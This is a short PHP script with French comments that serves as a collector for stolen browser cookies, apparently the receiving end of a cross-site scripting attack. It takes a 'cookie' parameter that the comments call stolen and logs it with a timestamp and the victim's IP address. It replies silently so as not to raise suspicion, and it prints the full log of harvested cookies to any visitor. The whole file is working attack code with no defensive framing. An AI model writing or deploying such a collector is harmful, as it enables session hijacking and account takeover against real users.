<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);

    ob_start();


    // Vérifier si un cookie est passé en paramètre
    if (isset($_GET['cookie'])) {
        // Récupérer le cookie volé
        $cookie = $_GET['cookie'];

        // Définir le fichier où stocker les cookies
        $fichier = "cookies.txt";

        // Ajouter un horodatage et l'IP de la victime
        $ligne = "[" . date("Y-m-d H:i:s") . "] IP: " . $_SERVER['REMOTE_ADDR'] . " | Cookie: " . $cookie . "\n";

        // Écriture dans le fichier (mode append pour ajouter sans écraser)
        file_put_contents($fichier, $ligne, FILE_APPEND | LOCK_EX);
        clearstatcache(); // Vide le cache du fichier pour s'assurer que fetch le voit bien


        // Réponse silencieuse (évite de lever des soupçons)
        http_response_code(200);
    }



    // pour print le fichier cookies.txt
    $fichier = "cookies.txt";
    if (file_exists($fichier)) {
        header("Content-Type: text/plain; charset=UTF-8");
        echo file_get_contents($fichier);
    } else {
        http_response_code(404);
        echo "Erreur : fichier introuvable.";
    }
    
    ob_end_flush();
?>